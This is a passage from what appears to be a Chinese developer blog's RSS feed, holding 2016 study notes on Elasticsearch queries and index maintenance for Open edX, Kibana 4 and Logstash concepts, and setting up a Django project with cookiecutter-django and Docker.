class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;交互工具使用httpie取代curl&lt;/p&gt;
&lt;h3&gt;导入数据&lt;/h3&gt;
&lt;p&gt;http POST :9200/_bulk &amp;lt; book_document.json &lt;/p&gt;
&lt;p&gt;http http://localhost:9200/library/book/_count , 一共有4条数据&lt;/p&gt;
&lt;h3&gt;搜索&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http GET :9200/library/book/_search query:&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{&amp;quot;query_string&amp;quot;:{&amp;quot;query&amp;quot;:&amp;quot;title:crime&amp;quot;}}&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;#/&amp;lt;index&amp;gt;/&amp;lt;type&amp;gt;&lt;/span&gt;

http GET :9200/library/book/_search query:&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{&amp;quot;query&amp;quot;:{&amp;quot;match_all&amp;quot;:{}}}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;日常管理&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;列出所有index：/_cat/indices?v (http localhost:9200/_cat/indices?v)&lt;ul&gt;
&lt;li&gt;而在0.92版本中则要使用/_status (http localhost:9200/_status),旧版的文档参考&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/0.90/index.html"&gt;这里&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;用例&lt;/h3&gt;
&lt;p&gt;如果你在Open edX中启用课程/内容搜索功能，那么课程数据将被索引到elasticsearch里。目前这部分有一个问题，当课程被删除后索引还存在，如果不手动删除，用户还能检索出课程。这是个bug&lt;/p&gt;
&lt;p&gt;我们先探索索引的结构&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http localhost:9200/_status
http localhost:9200/courseware_index/_status
http localhost:9200/courseware_index/_search
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#查找特定课程索引&lt;/span&gt;
http  localhost:9200/courseware_index/_search?q&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;#可以看到index和type&lt;/span&gt;

&lt;span class="c1"&gt;#删除特定课程索引&lt;/span&gt;
http delete &lt;span class="s2"&gt;&amp;quot;localhost:9200/courseware_index/course_info/_query?q=course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;
&lt;span class="c1"&gt;#or&lt;/span&gt;
curl -XDELETE &lt;span class="s2"&gt;&amp;quot;localhost:9200/courseware_index/course_info/_query?q=course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;一些学习笔记&lt;/h1&gt;
&lt;h3&gt;&lt;a href="http://es.xiaoleilu.com/052_Mapping_Analysis/40_Analysis.html"&gt;分析和分析器&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;标准化这些词为标准形式，提高它们的“可搜索性”或“查全率”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;标准分析器&lt;/h4&gt;
&lt;p&gt;标准分析器是Elasticsearch默认使用的分析器。对于文本分析，它对于任何语言都是最佳选择（译者注：就是没啥特殊需求，对于任何一个国家的语言，这个分析器就够用了）
它根据Unicode Consortium的定义的单词边界(word boundaries)来切分文本，然后去掉大部分标点符号。最后，把所有词转为小写&lt;/p&gt;
&lt;h3&gt;&lt;a href="http://es.xiaoleilu.com/052_Mapping_Analysis/50_Complex_datatypes.html"&gt;object嵌套的索引&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Lucene 并不了解内部对象。 一个 Lucene 文件包含一个键-值对应的扁平表单。 为了让 Elasticsearch 可以有效的索引内部对象，将文件转换为扁平格式&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;tweet&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;            &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;elasticsearch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;flexible&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;very&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user.id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;          &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;@johnsmith&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user.gender&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;      &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;male&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user.age&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;         &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user.name.full&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;john&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;smith&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user.name.first&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;john&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user.name.last&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;smith&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;关联内部对象可解决此类问题，我们称之为嵌套对象&lt;/p&gt;
&lt;h3&gt;&lt;a href="http://es.xiaoleilu.com/052_Mapping_Analysis/00_Intro.html"&gt;映射和分析&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;映射(mapping)机制用于进行字段类型确认，将每个字段匹配为一种确定的数据类型(string, number, booleans, date等)。&lt;/p&gt;
&lt;h5&gt;查看映射&lt;/h5&gt;
&lt;p&gt;GET /edx_tracking_log/_mapping/logs&lt;/p&gt;
&lt;p&gt;string类型字段默认值是analyzed，对于不允许全文索引的字段需要注明&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{
    &amp;quot;tag&amp;quot;: {
        &amp;quot;type&amp;quot;:     &amp;quot;string&amp;quot;,
        &amp;quot;index&amp;quot;:    &amp;quot;not_analyzed&amp;quot;
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;周边&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dzharii/awesome-elasticsearch"&gt;awesome-elasticsearch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/medcl/elasticsearch-analysis-ik"&gt;中文分词&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/medcl/elasticsearch-rtf"&gt;elasticsearch-rtf&lt;/a&gt;：elasticsearch中文发行版&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/taskrabbit/elasticsearch-dump"&gt;elasticsearch-dump&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NLPchina/elasticsearch-sql"&gt;elasticsearch-sql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/elastic/elasticsearch-dsl-py"&gt;elasticsearch-dsl-py&lt;/a&gt; : High level Python client for Elasticsearch&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/elastic/elasticsearch-py"&gt;elasticsearch-py&lt;/a&gt;:Official Python low-level client for Elasticsearch.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Yelp/elastalert"&gt;elastalert&lt;/a&gt;:找出elk中有问题的数据&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/oliver006/elasticsearch-gmail"&gt;elasticsearch-gmail&lt;/a&gt;: use python&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至于&lt;a href="https://github.com/elastic/logstash"&gt;logstash&lt;/a&gt;和&lt;a href="https://github.com/elastic/kibana"&gt;kibana&lt;/a&gt;,将作为单独的章节介绍&lt;/p&gt;
&lt;p&gt;更多案例参考&lt;a href="https://github.com/elastic/examples"&gt;elastic/examples&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.coding.net/blog/elastic-search"&gt;如何使用正确的姿势进行搜索&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://es.xiaoleilu.com/"&gt;Elasticsearch 权威指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://learnes.net/"&gt;Elasticsearch 权威指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/05cff717563c"&gt;Elasticsearch学习笔记&lt;/a&gt;:概念清晰&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/siddontang/elasticsearch-note"&gt;elasticsearch-note&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/2c7b0c76fa04"&gt;Elasticsearch、MongoDB和Hadoop比较&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.searchtech.pro/elasticsearch-users-case"&gt;一些国外优秀的elasticsearch使用案例&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/25535889"&gt;elasticsearch（lucene）可以代替NoSQL（mongodb）吗&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-16:elasticsearch-note.html</guid><category>dev-tools</category></item><item><title>kibana4学习笔记</title><link>/kibana4-note.html</link><description>&lt;p&gt;以下是学习Kibana时做的笔记&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Kibana 是为 Elasticsearch设计的开源分析和可视化平台。你可以使用 Kibana 来搜索，查看存储在 Elasticsearch 索引中的数据并与之交互。你可以很容易实现高级的数据分析和可视化，以图标的形式展现出来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Kibana 是 Elasticsearch 分析和搜索仪表板。已经历经了 v1, v2, v3, v4 个版本，分别采用了 PHP，Ruby，AngularJS，JRuby，NodeJS 等不同语言编写。我们主要关注v3 和 v4 的区别。实际项目中尽量用v4&lt;/p&gt;
&lt;p&gt;Kibana 非常容易安装和使用。整个项目都是用 HTML 和 Javascript 写的，所以 Kibana 不需要任何服务器端组件，一个纯文本发布服务器就够了&lt;/p&gt;
&lt;p&gt;ELK 这一套体系，不应该和 Hadoop 体系同质化。定期的离线报表，不是 Elasticsearch 专长所在.&lt;/p&gt;
&lt;p&gt;Kibana 的使用场景，应该集中在两方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实时监控&lt;ul&gt;
&lt;li&gt;通过 histogram 面板，配合不同条件的多个 queries 可以对一个事件走很多个维度组合出不同的时间序列走势。时间序列数据是最常见的监控报警了。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;问题分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于 elk 的用途，可以参照其对应的商业产品 splunk 的场景：使用 Splunk 的意义在于使信息收集和处理智能化。而其操作智能化表现在：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;搜索，通过下钻数据排查问题，通过分析根本原因来解决问题；&lt;/li&gt;
&lt;li&gt;实时可见性，可以将对系统的检测和警报结合在一起，便于跟踪 SLA 和性能问题；&lt;/li&gt;
&lt;li&gt;历史分析，可以从中找出趋势和历史模式，行为基线和阈值，生成一致性报告。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;v3 / v4对比&lt;/h1&gt;
&lt;p&gt;Kibana4 在使用 &lt;code&gt;Aggregation&lt;/code&gt; 接口提供更复杂功能和更高性能的同时，彻底改变了用户的使用形式。用户必须明确了解 ES 各个 aggs 接口的意义，请求和响应体的数据情况；还要想清楚可视化的展现形式，充分理解数据字段的作用。然后才能实现想要的结果。毫无疑问，这是有学习成本的。&lt;/p&gt;
&lt;h1&gt;metric 和 bucket是什么&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations.html#search-aggregations"&gt;aggregations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://qbox.io/blog/elasticsearch-aggregations"&gt;An Introduction to Elasticsearch Aggregations&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知识点&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;你可以在 Visualization页为你的搜索结构构造可视化。每个可视化都是跟一个搜索关联着的&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.code123.cc/docs/kibana-logstash/v4/setup.html"&gt;本地安装&lt;/a&gt;：跨平台，无依赖&lt;ul&gt;
&lt;li&gt;5601端口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;默认情况下，Kibana 会连接运行在 localhost 的 Elasticsearch。要连接其他 Elasticsearch 实例，修改 kibana.yml 里的 Elasticsearch URL，然后重启 Kibana。如何在生产环境下使用 Kibana，阅读 [Using Kibana in a Production Environment].&lt;/li&gt;
&lt;li&gt;索引：&lt;ul&gt;
&lt;li&gt;默认情况下，Kibana 认为你要访问的是通过 Logstash 导入 Elasticsearch 的数据。这时候你可以用默认的 logstash-* 作为你的 index pattern。&lt;/li&gt;
&lt;li&gt;选择一个包含了时间戳的索引字段，可以用来做基于时间的处理。Kibana 会读取索引的映射，然后列出所有包含了时间戳的字段(译者注：实际是字段类型为 date 的字段，而不是“看起来像时间戳”的字段)。如果你的索引没有基于时间的数据，关闭 Index contains time-based events 参数。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;默认的时间过滤器设置为最近 15 分钟&lt;ul&gt;
&lt;li&gt;发挥：意味着这是一个real-time展示&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;discover&lt;ul&gt;
&lt;li&gt;你可以直接输入简单的请求字符串，也就是用 Lucene query syntax，也可以用完整的基于 JSON 的 Elasticsearch Query DSL。&lt;/li&gt;
&lt;li&gt;当你提交搜索的时候，直方图，文档表格，字段列表，都会自动反映成搜索的结果。hits(匹配的文档)总数会在直方图的右上角显示。文档表格显示前 500 个匹配文档。&lt;/li&gt;
&lt;li&gt;默认的，文档倒序排列，最新的文档最先显示&lt;/li&gt;
&lt;li&gt;发挥：要搜素课程太容易了，探索课程和学生staff&lt;ul&gt;
&lt;li&gt;使用 Lucene query syntax就可以做简易搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你可以在 Discover 页加载已保存的搜索，也可以用作 visualizations 的基础。保存一个搜索，意味着同时保存下了搜索请求字符串和当前选择的索引模式。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Visualize&lt;ul&gt;
&lt;li&gt;你可以保存可视化，以后再用，或者合并到 dashboard 里。一个可视化可以基于以下几种数据源类型：&lt;ul&gt;
&lt;li&gt;一个新的交互式搜索&lt;/li&gt;
&lt;li&gt;一个已保存的搜索&lt;/li&gt;
&lt;li&gt;一个已保存的可视化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可视化是基于 Elasticsearch 1 引入的聚合(aggregation) 特性。&lt;/li&gt;
&lt;li&gt;可以通过Settings &amp;gt; Edit Saved Objects 来管理已存的可视化。&lt;/li&gt;
&lt;li&gt;用页面左侧的聚合构建器配置你的可视化要用的 metric 和 bucket 聚合。&lt;code&gt;桶(Buckets) 的效果类似于 SQL GROUP BY&lt;/code&gt; 语句。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;dashboard&lt;ul&gt;
&lt;li&gt;要用仪表板，你需要至少有一个已保存的 visualization。&lt;/li&gt;
&lt;li&gt;分享仪表板&lt;ul&gt;
&lt;li&gt;你可以分享仪表板给其他用户。可以直接分享 Kibana 的仪表板链接，也可以嵌入到你的网页里。&lt;/li&gt;
&lt;li&gt;用户必须有 Kibana 的访问权限才能看到嵌入的仪表板。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;认证鉴权&lt;/h1&gt;
&lt;h3&gt;v3&lt;/h3&gt;
&lt;p&gt;参考：&lt;a href="http://www.code123.cc/docs/kibana-logstash/v3/auth/nodejs-cas.html"&gt;用 nodejs 实现 CAS 认证&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;v4&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/trevan/oauth2"&gt;oauth2&lt;/a&gt;:k4的oauth2插件&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fangli/kibana-authentication-proxy"&gt;kibana-authentication-proxy&lt;/a&gt;:kibana的认证机制（cas）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Todo:思考&lt;/h1&gt;
&lt;p&gt;关于可视化 ， 二维平面在展示什么 每种图表的特性。&lt;br /&gt;
一些概念：向量，特征值，降维，桶(Buckets) &lt;/p&gt;
&lt;p&gt;关于图表的可视化，推荐阅读《数据可视化的基本原理与方法》&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.code123.cc/docs/kibana-logstash/v4/discover.html"&gt;Elasticsearch 官方指南 Kibana 部分&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/elastic/kibana"&gt;kibana&lt;/a&gt;:Kibana analytics and search dashboard for Elasticsearch&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-16:kibana4-note.html</guid><category>dev-tools</category></item><item><title>logstash学习笔记</title><link>/logstash-note.html</link><description>&lt;p&gt;以下是学习Kibana时做的笔记&lt;/p&gt;
&lt;h1&gt;优点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Elasticsearch 全部采用 JSON 接口，Logstash 是 Ruby DSL 设计，都是目前业界最通用的配置语法设计&lt;/li&gt;
&lt;li&gt;不管是 Elasticsearch 集群还是 Logstash 集群都是可以线性扩展的；&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;理解&lt;/h1&gt;
&lt;p&gt;把它理解为管道&lt;/p&gt;
&lt;h1&gt;知识点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Logstash 会给事件添加一些额外信息。最重要的就是 @timestamp，用来标记事件的发生时间。因为这个字段涉及到 Logstash 的内部流转&lt;/li&gt;
&lt;li&gt;大多数时候，还可以见到另外几个：&lt;ul&gt;
&lt;li&gt;host 标记事件发生在哪里。&lt;/li&gt;
&lt;li&gt;type 标记事件的唯一类型。&lt;/li&gt;
&lt;li&gt;tags 标记事件的某方面属性。这是一个数组，一个事件可以有多个标签。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你可以随意给事件添加字段或者从事件里删除字段。事实上事件就是一个 Ruby 对象，或者更简单的理解为就是一个哈希也行。&lt;/li&gt;
&lt;li&gt;插件机制&lt;ul&gt;
&lt;li&gt;输入插件(Input)：input是个插件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;input&lt;/h1&gt;
&lt;h3&gt;file&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Logstash 使用一个名叫 FileWatch 的 Ruby Gem 库来监听文件变化。这个库支持 glob 展开文件路径，而且会记录一个叫 .sincedb 的数据库文件来跟踪被监听的日志文件的当前读取位置。所以，不要担心 logstash 会漏过你的数据。&lt;/li&gt;
&lt;li&gt;FileWatch 只支持文件的绝对路径&lt;/li&gt;
&lt;li&gt;默认15秒刷新一次更新&lt;/li&gt;
&lt;li&gt;/path/to/&lt;strong&gt;/*.log，用 &lt;/strong&gt; 来缩写表示递归全部子目录&lt;/li&gt;
&lt;li&gt;最简单的输入输出，&lt;a href="http://kibana.logstash.es/content/logstash/plugins/input/stdin.html"&gt;stdin.html&lt;/a&gt;,便于做实验&lt;/li&gt;
&lt;li&gt;type 和 tags 是 logstash 事件中两个特殊的字段。通常来说我们会在输入区段中通过 type 来标记事件类型 —— 我们肯定是提前能知道这个事件属于什么类型的。而 tags 则是在数据处理过程中，由具体的插件来添加或者删除的。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;tcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;但 Logstash 本身只能在 SizedQueue 中缓存 20 个事件。这就是我们建议在生产环境中换用其他消息队列的原因。&lt;/li&gt;
&lt;li&gt;最常见的用法就是配合 nc 命令导入旧数据&lt;/li&gt;
&lt;li&gt;这种做法比用 LogStash::Inputs::File 好，因为当 nc 命令结束，我们就知道数据导入完毕了。而用 input/file 方式，logstash 进程还会一直等待新数据输入被监听的文件，不能直接看出是否任务完成了。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;codec&lt;/h1&gt;
&lt;p&gt;Logstash 不只是一个input | filter | output 的数据流，而是一个 input | decode | filter | encode | output 的数据流！codec 就是用来 decode、encode 事件的。&lt;/p&gt;
&lt;h1&gt;过滤器插件(Filter)&lt;/h1&gt;
&lt;h2&gt;data&lt;/h2&gt;
&lt;h3&gt;filters/date 插件支持五种时间格式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ISO8601&lt;ul&gt;
&lt;li&gt;类似 "2011-04-19T03:44:01.103Z" 这样的格式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UNIX&lt;/li&gt;
&lt;li&gt;UNIX_MS&lt;ul&gt;
&lt;li&gt;JavaScript 里经常使用这个时间格式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;时区问题的解释&lt;/h3&gt;
&lt;p&gt;为什么 @timestamp 比我们早了 8 个小时？怎么修改成北京时间？ &lt;br /&gt;
Elasticsearch 内部，对时间类型字段，是统一采用 UTC 时间，对于页面查看，ELK 的解决方案是在 Kibana 上，读取浏览器的当前时区，然后在页面上转换时间内容的显示。建议大家接受这种设定&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Grok 正则捕获&lt;/h2&gt;
&lt;p&gt;Grok 是 Logstash 最重要的插件。你可以在 grok 里预定义好命名正则表达式，在稍后引用它。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\s+(?&amp;lt;request_time&amp;gt;\d+(?:\.\d+)?)\s+&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;对于 Perl 或者 Ruby 程序员应该很熟悉了，Python 程序员可能更习惯写 (?P&lt;name&gt;pattern)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;&lt;a href="http://kibana.logstash.es/content/logstash/plugins/filter/json.html"&gt;JSON 编解码&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;有些日志可能是一种复合的数据结构，其中只是一部分记录是 JSON 格式的。这时候，我们依然需要在 filter 阶段，单独启用 JSON 解码插件&lt;/p&gt;
&lt;h2&gt;随心所欲的 Ruby 处理&lt;/h2&gt;
&lt;p&gt;通常我们都是用 filters/grok 插件来捕获字段的，正则耗费大量的 CPU 资源。
很多流经 Logstash 的数据都是有自己预定义的特殊分隔符的，我们可以很简单的直接切割成多个字段。&lt;/p&gt;
&lt;h1&gt;output&lt;/h1&gt;
&lt;h2&gt;&lt;a href="http://kibana.logstash.es/content/logstash/plugins/output/elasticsearch.html"&gt;保存进 Elasticsearch&lt;/a&gt;:这节是匹配最新版本的&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;flush_size 和 idle_flush_time 共同控制 Logstash 向 Elasticsearch 发送批量数据的行为。以上面示例来说：Logstash 会努力攒到 20000 条数据一次性发送出去，但是如果 10 秒钟内也没攒够 20000 条，Logstash 还是会以当前攒到的数据量发一次。&lt;/li&gt;
&lt;li&gt;logstash能向远方机器发送log&lt;/li&gt;
&lt;li&gt;注意索引名中不能有大写字母&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;模板&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Elasticsearch 支持给索引预定义设置和 mapping。Logstash 自带有一个优化好的模板，默认模板的"template" 为"logstash-*"&lt;/li&gt;
&lt;li&gt;Elasticsearch 是一个近实时搜索引擎。它实际上是每 1 秒钟刷新一次数据。对于日志分析应用，我们用不着这么实时，所以 logstash 自带的模板修改成了 5 秒钟&lt;/li&gt;
&lt;li&gt;这种类型会自动添加一个 ".raw" 结尾的字段，并给这个字段设置为不启用分词器。简单说，你想获取 url 字段的聚合结果的时候，不要直接用 "url" ，而是用 "url.raw" 作为字段名。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kibana.logstash.es/content/"&gt;ELKstack 中文指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-16:logstash-note.html</guid><category>dev-tools</category></item><item><title>使用cookiecutter-django开始你的django项目</title><link>/use-cookiecutter-django-to-startup-django-project.html</link><description>&lt;h1&gt;&lt;a href="https://github.com/pydanny/cookiecutter-django"&gt;cookiecutter-django&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;Cookiecutter Django is a framework for jumpstarting production-ready Django projects quickly.&lt;/p&gt;
&lt;h1&gt;Features&lt;/h1&gt;
&lt;p&gt;我只列出我关注的特性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;For Django 1.9 //最新版本angular可选，支持docker&lt;/li&gt;
&lt;li&gt;Renders Django projects with 100% starting test coverage&lt;/li&gt;
&lt;li&gt;Twitter Bootstrap v4.0.0 - alpha&lt;/li&gt;
&lt;li&gt;End-to-end via Hitch&lt;/li&gt;
&lt;li&gt;AngularJS&lt;/li&gt;
&lt;li&gt;12-Factor based settings via django-environ&lt;/li&gt;
&lt;li&gt;Docker support using docker-compose for development and production&lt;/li&gt;
&lt;li&gt;Comes with custom user model ready to go.&lt;/li&gt;
&lt;li&gt;Run tests with unittest or py.test&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;start up&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;pip install cookiecutter&lt;/li&gt;
&lt;li&gt;cookiecutter https://github.com/pydanny/cookiecutter-django.git&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mac/windows&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;You’ll need at least docker 1.10 : &lt;a href="https://github.com/docker/toolbox/releases"&gt;toolbox download&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;docker-machine create --driver virtualbox default&lt;/li&gt;
&lt;li&gt;docker-machine ip&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;p&gt;linux直接使用docker就行&lt;/p&gt;
&lt;h3&gt;help&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker-compose --help&lt;/li&gt;
&lt;li&gt;docker-machine --help&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;build&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;cd 到项目根目录&lt;/li&gt;
&lt;li&gt;eval (docker-machine env default)&lt;/li&gt;
&lt;li&gt;docker-compose -f dev.yml build&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;start it&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker-compose -f dev.yml up&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Running management commands&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker-compose -f dev.yml run django python manage.py migrate&lt;/li&gt;
